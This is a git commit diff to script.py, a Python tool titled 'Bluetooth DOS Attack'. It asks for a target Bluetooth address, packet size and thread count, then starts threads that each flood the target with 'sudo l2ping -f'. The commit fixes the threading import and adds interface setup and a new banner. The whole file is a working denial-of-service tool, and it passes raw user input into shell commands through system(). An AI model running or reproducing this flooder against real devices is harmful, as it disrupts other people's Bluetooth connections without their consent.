034b834bd505a183786485d85e74af0b42eeff54
Diego Bloise <diego-dev@outlook.com>
2022-05-07 11:39:22 -0300

    update

--- script.py
+++ script.py
@@ -1,55 +1,61 @@
 from os import system
 from time import sleep
-from threading import Threads
+from threading import Thread
+
+
+def setup_interface():
+    system("sudo rfkill unblock bluetooth")
+    system("sudo hciconfig -a hci0 up")
 
 
 def attack(pack_size, targed_addr):
-    system(f"l2ping -i hci0 -s {pack_size} -f {targed_addr}")
+    system(f"sudo l2ping -i hci0 -s {pack_size} -f {targed_addr}")
 
 
 def banner():
-    print("\x1b[37;4mhttps://github.com/DiegoBloise\x1b[0m")
+    print("{:.^71}".format("\x1b[37;4mhttps://github.com/DiegoBloise\x1b[0m"))
     print("\x1b[37;36m")
-    print("{:30^}".format("Bluetooth DOS Attack"))
-    print()
-    print()
-    print()
-    print()
-    print()
-    print()
-    print()
-    print()
-    print()
-    print()
-    print()
+    print("""
+    *****       *****            ***                       
+     *   *       *   *          *   *                      
+     *   *       *   *          *                          
+     *   *       *   *          *       ****    ****       
+     *   *       ****            ***   *    *  *    *      
+     *   *       *   *              *  ******  *           
+     *   *       *   *              *  *       *           
+     *   * **    *   * **       *   *  *    *  *    *  **  
+    *****  **   *****  **        ***    ****    ****   **
+    """)
     print("\x1b[0m")
+    print("{:.^60}".format("Bluetooth DOS Attack"))
+    print("")
 
 
 def main():
     banner()
     sleep(0.1)
     print()
-    print("\x1b[31mTHIS SOFTWARE IS PROVIDED \"AS IS\" WITHOUT WARRANTY OF ANY KIND.\nYOU MAY USE THIS SOFTWARE AT YOUR OWN RISK.\nTHE USE IS COMPLETE RESPONSABILITY OF THE END-USER.\nTHE DEVELOPERS ASSUME NO LIABILITY AND ARE NOT RESPONSIBLE FOR ANY MISUSE OR DAMAGE CAUSED BY THIS PROGRAM.")
-    if (input("Do you agree? [Y/n] ~> ") in ["\n", "Y", "y"]):
+    print("\x1b[31mTHIS SOFTWARE IS PROVIDED \"AS IS\" WITHOUT WARRANTY OF ANY KIND.\nYOU MAY USE THIS SOFTWARE AT YOUR OWN RISK.\nTHE USE IS COMPLETE RESPONSABILITY OF THE END-USER.\nTHE DEVELOPERS ASSUME NO LIABILITY AND ARE NOT RESPONSIBLE FOR\nANY MISUSE OR DAMAGE CAUSED BY THIS PROGRAM.\n")
+    if (input("Do you agree? [y/n] ~> ") in ["Y", "y"]):
         sleep(0.1)
         system("clear")
         banner()
         print()
 
-        targed_addr = input("Target address ~> ")
+        targed_addr = input("{:>20}".format("Target address ~> "))
 
         if len(targed_addr) < 1:
             print("[!] ERROR: Target address is missing.")
             exit(0)
         
         try:
-            pack_size = int(input("Packages size ~> "))
+            pack_size = int(input("{:>20}".format("Packages size ~> ")))
         except:
             print("[!] ERROR: Packages size must be an integer.")
             exit(0)
 
         try:
-            threads = int(input("Threads ~> "))
+            threads = int(input("{:>20}".format("Threads ~> ")))
         except:
             print("[!] ERROR: Threads must be an integer.")
             exit(0)
@@ -68,7 +74,7 @@ def main():
 
         for i in range(0, threads):
             print(f"[*] Built thread Nº {i + 1}")
-            Threads(target=attack, args=[pack_size, targed_addr]).start()
+            Thread(target=attack, args=[pack_size, targed_addr]).start()
 
         print("[*] Built all threads...")
         print("[*] Starting...")
